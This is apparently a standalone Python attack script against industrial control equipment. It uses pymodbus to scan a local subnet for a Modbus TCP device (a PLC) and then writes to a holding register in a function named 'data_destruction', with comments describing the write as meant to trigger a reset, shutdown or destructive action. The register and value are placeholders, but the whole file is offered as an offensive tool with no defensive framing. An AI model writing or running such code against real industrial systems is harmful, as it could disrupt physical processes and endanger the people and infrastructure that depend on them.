import socket
import struct
import time
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    subnet = '192.168.9.0/24'
    ip_list = [f"192.168.9.{i}" for i in range(1, 255)]
    
    for ip in ip_list:
        try:
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except Exception as e:
            print(f"Failed to connect to {ip}: {e}")
    
    print("PLC not found on the network.")
    return None

# Function to perform data destruction
def data_destruction(plc_ip):
    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print("Failed to connect to the PLC.")
        return
    
    try:
        # Example: Write to a specific register to trigger a destructive action
        # This is a placeholder for the actual destructive action
        # For example, setting a specific memory bit to trigger a reset or shutdown
        register_address = 0x0001  # Example register address
        value_to_write = 0x0001  # Example value to write
        
        # Write the value to the register
        result = client.write_register(register_address, value_to_write)
        if result.isError():
            print("Failed to write to the register.")
        else:
            print("Data destruction initiated.")
        
        # Optionally, read back the register to verify the write
        result = client.read_holding_registers(register_address, 1)
        if result.isError():
            print("Failed to read the register.")
        else:
            print(f"Register value: {result.registers[0]}")
    
    except Exception as e:
        print(f"An error occurred: {e}")
    
    finally:
        client.close()

# Main function
def main():
    plc_ip = discover_plc_ip()
    if plc_ip:
        data_destruction(plc_ip)

if __name__ == "__main__":
    main()